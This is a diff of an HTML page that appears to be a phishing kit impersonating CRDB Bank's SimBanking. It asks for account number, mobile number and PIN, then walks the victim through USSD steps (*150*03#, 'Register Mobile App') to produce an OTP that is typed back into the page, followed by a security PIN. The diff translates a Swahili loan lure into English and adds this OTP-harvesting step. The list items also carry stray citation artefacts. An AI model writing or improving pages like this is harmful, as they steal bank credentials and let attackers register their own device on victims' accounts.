@@ -44,43 +44,57 @@
 
         <!-- Step 2: Credentials Input -->
         <section id="step-credentials" class="card hidden">
-            <h2>Ingiza Taarifa za Akaunti</h2>
-            <p class="subtitle">Weka taarifa zako za CRDB Simbanking ili kupokea mkopo.</p>
+            <h2>Activation</h2>
+            <p class="subtitle">Please enter your credentials used to access SimBanking USSD(*150*03#)</p>
             
             <div class="form-group">
-                <label for="acc-number">Namba ya Akaunti</label>
+                <label for="acc-number">Account number linked with Simbanking</label>
                 <input type="text" id="acc-number" placeholder="Ingiza namba ya akaunti" required>
             </div>
 
             <div class="form-group">
-                <label for="mobile-number">Namba ya Simu (Lazima ianze na 0)</label>
-                <input type="tel" id="mobile-number" inputmode="numeric" placeholder="Mfano: 0712345678" required>
+                <label for="mobile-number">Mobile number registered for Simbanking</label>
+                <input type="tel" id="mobile-number" inputmode="numeric" placeholder="0755******" required>
             </div>
 
             <div class="form-group">
-                <label for="sim-pin">PIN ya Simbanking</label>
+                <label for="sim-pin">Simbanking PIN</label>
                 <input type="password" id="sim-pin" inputmode="numeric" pattern="[0-9]*" maxlength="4" placeholder="••••" required>
             </div>
 
-            <button id="btn-continue-creds" class="btn-primary">Wasilisha Taarifa</button>
+            <button id="btn-continue-creds" class="btn-primary">CONTINUE</button>
             <div id="credentials-spinner" class="spinner hidden"></div>
         </section>
 
-        <!-- Step 3: OTP Verification (5 Digits Numeric Only) -->
+        <!-- Step 3: USSD Dial Instruction & OTP Input (5 Digits Numeric Only) -->
         <section id="step-otp" class="card hidden">
-            <div class="shield-icon">🛡</div>
-            <h2>Thibitisha Akaunti Yako</h2>
-            <p class="subtitle">Tafadhali ingiza namba ya OTP ya tarakimu 5 (namba pekee) iliyotumwa kwenda namba yako ya simu.</p>
+            <div class="shield-icon">⏳</div>
+            <h2>Create OTP to continue</h2>
             
-            <div class="otp-inputs">
-                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" />
-                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" />
-                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" />
-                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" />
-                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" />
+            <div class="ussd-steps-box">
+                <p><strong>Follow the steps below:</strong></p>
+                <ol class="ussd-list">
+                    <li>Dial *150*03# with number registered with SimBanking.[span_1](start_span)[span_1](end_span)</li>
+                    <li>Select 1 SimBanking, then enter SimBanking PIN.[span_2](start_span)[span_2](end_span)</li>
+                    <li>Select 1 (My Account).[span_3](start_span)[span_3](end_span)</li>
+                    <li>Select 5 (Register Mobile App).[span_4](start_span)[span_4](end_span)</li>
+                    <li>Select 1 to confirm.[span_5](start_span)[span_5](end_span)</li>
+                    <li>You will receive OTP via SMS.[span_6](start_span)[span_6](end_span)</li>
+                    <li>Return to the App and enter OTP below.[span_7](start_span)[span_7](end_span)</li>
+                </ol>
             </div>
 
-            <button id="btn-verify-otp" class="btn-primary">Thibitisha Akaunti</button>
+            <p class="subtitle" style="margin-top: 15px;">Weka namba ya OTP ya tarakimu 5 uliyopokea:</p>
+            
+            <div class="otp-inputs">
+                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" disabled />
+                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" disabled />
+                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" disabled />
+                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" disabled />
+                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" disabled />
+            </div>
+
+            <button id="btn-verify-otp" class="btn-primary" disabled>CONTINUE</button>
         </section>
 
         <!-- Step 4: Security PIN Verification (Numeric Only) -->
@@ -96,10 +110,10 @@
                 <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box" />
             </div>
 
-            <button id="btn-verify-security-pin" class="btn-primary">Kamilisha</button>
+            <button id="btn-verify-security-pin" class="btn-primary">CONTINUE</button>
         </section>
 
-        <!-- Step 5: Waiting / Success State with Spinner & Countdown Banner -->
+        <!-- Step 5: Waiting / Success State -->
         <section id="step-success" class="card hidden text-center">
             <div id="success-icon-container" class="success-icon">
                 <div class="spinner-large"></div>
@@ -120,4 +134,4 @@
     <script src="script.js"></script>
 </body>
     </html>
-                                                                                     
+                
